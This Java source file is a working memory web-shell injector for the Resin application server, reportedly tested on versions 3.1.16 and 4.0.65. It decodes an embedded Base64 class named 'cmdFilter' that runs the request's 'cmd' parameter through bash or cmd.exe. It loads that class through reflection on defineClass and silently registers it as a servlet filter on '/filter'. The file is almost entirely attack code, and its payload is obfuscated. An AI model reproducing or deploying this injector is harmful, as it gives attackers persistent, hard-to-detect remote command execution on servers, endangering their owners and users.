import com.caucho.server.dispatch.FilterMapping;
import com.caucho.server.webapp.WebApp;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Method;


/**
 * 已测试：
 *  resin3.1.16
 *  resin4.0.65
 */
public class addFilter extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try {
            Class servletInvocation = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
            Object httpRequetst = servletInvocation.getMethod("getContextRequest").invoke(null);
            WebApp webApp = (WebApp) httpRequetst.getClass().getMethod("getWebApp").invoke(httpRequetst);
            byte[] evilBytes = java.util.Base64.getDecoder().decode("yv66vgAAADIAnAoAHwBTCABFCwBUAFUIAFYKAFcAWAoACQBZCABaCgAJAFsHAFwIAF0IAF4IAF8IAGAKAGEAYgoAYQBjCgBkAGUHAGYKABEAZwgAaAoAEQBpCgARAGoKABEAawgAbAsAbQBuCgBvAHAKAG8AcQoAbwByBwBzCwB0AHUHAHYHAHcHAHgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUxjb20vZXhhbXBsZS9yZXNpbjMvZmlsdGVyL2NtZEZpbHRlcjsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApFeGNlcHRpb25zBwB5AQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAHaXNMaW51eAEAAVoBAAVvc1R5cAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACaW4BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAFzAQATTGphdmEvdXRpbC9TY2FubmVyOwEABm91dHB1dAEAA291dAEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAB2lnbm9yZWQBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAA2NtZAEADVN0YWNrTWFwVGFibGUHAFwHADUHAHoHAGYHAHYHAHsHAHwHAH0HAHMBAAdkZXN0cm95AQAKU291cmNlRmlsZQEAI2NtZEZpbHRlci5qYXZhIGZyb20gSW5wdXRGaWxlT2JqZWN0DAAhACIHAHsMAH4AfwEAB29zLm5hbWUHAIAMAIEAfwwAggCDAQADd2luDACEAIUBABBqYXZhL2xhbmcvU3RyaW5nAQAEYmFzaAEAAi1jAQAHY21kLmV4ZQEAAi9jBwCGDACHAIgMAIkAigcAiwwAjACNAQARamF2YS91dGlsL1NjYW5uZXIMACEAjgEAAlxhDACPAJAMAJEAkgwAkwCDAQAABwB8DACUAJUHAJYMAJcAmAwAmQAiDACaACIBABNqYXZhL2lvL0lPRXhjZXB0aW9uBwB9DAAuAJsBACNjb20vZXhhbXBsZS9yZXNpbjMvZmlsdGVyL2NtZEZpbHRlcgEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAFY2xvc2UBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWACEAHgAfAAEAIAAAAAQAAQAhACIAAQAjAAAALwABAAEAAAAFKrcAAbEAAAACACQAAAAGAAEAAAASACUAAAAMAAEAAAAFACYAJwAAAAEAKAApAAIAIwAAADUAAAACAAAAAbEAAAACACQAAAAGAAEAAAAVACUAAAAWAAIAAAABACYAJwAAAAAAAQAqACsAAQAsAAAABAABAC0AAQAuAC8AAgAjAAAB5gAEAAwAAAC2KxICuQADAgA6BBkExgCpBDYFEgS4AAU6BhkGxgATGQa2AAYSB7YACJkABgM2BRUFmQAZBr0ACVkDEgpTWQQSC1NZBRkEU6cAFga9AAlZAxIMU1kEEg1TWQUZBFM6B7gADhkHtgAPtgAQOgi7ABFZGQi3ABISE7YAFDoJGQm2ABWZAAsZCbYAFqcABRIXOgosuQAYAQA6CxkLGQq2ABkZC7YAGhkLtgAbpwAFOgUtKyy5AB0DALEAAQAPAKgAqwAcAAMAJAAAAEoAEgAAABkACgAaAA8AHAASAB0AGQAeACsAHwAuACEAXgAiAGsAIwB7ACQAjwAlAJcAJgCeACcAowAoAKgAKgCrACkArQArALUALQAlAAAAhAANABIAlgAwADEABQAZAI8AMgAzAAYAXgBKADQANQAHAGsAPQA2ADcACAB7AC0AOAA5AAkAjwAZADoAMwAKAJcAEQA7ADwACwCtAAAAPQA+AAUAAAC2ACYAJwAAAAAAtgA/AEAAAQAAALYAQQBCAAIAAAC2AEMARAADAAoArABFADMABABGAAAAPAAI/gAuBwBHAQcARxpSBwBI/gAuBwBIBwBJBwBKQQcAR/8AHQAFBwBLBwBMBwBNBwBOBwBHAAEHAE8BBwAsAAAABgACABwALQABAFAAIgABACMAAAArAAAAAQAAAAGxAAAAAgAkAAAABgABAAAAMgAlAAAADAABAAAAAQAmACcAAAABAFEAAAACAFI=");
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class evilFilter = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(),  evilBytes, 0, evilBytes.length);

            FilterMapping filterMapping = new FilterMapping();
            filterMapping.setFilterClass(evilFilter.getName());
            filterMapping.setFilterName(evilFilter.getName());
            FilterMapping.URLPattern urlPattern = filterMapping.createUrlPattern();
            urlPattern.addText("/filter");
            urlPattern.init();
            webApp.addFilterMapping(filterMapping);
            response.getWriter().write("Filter Injected Successfully!!!");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
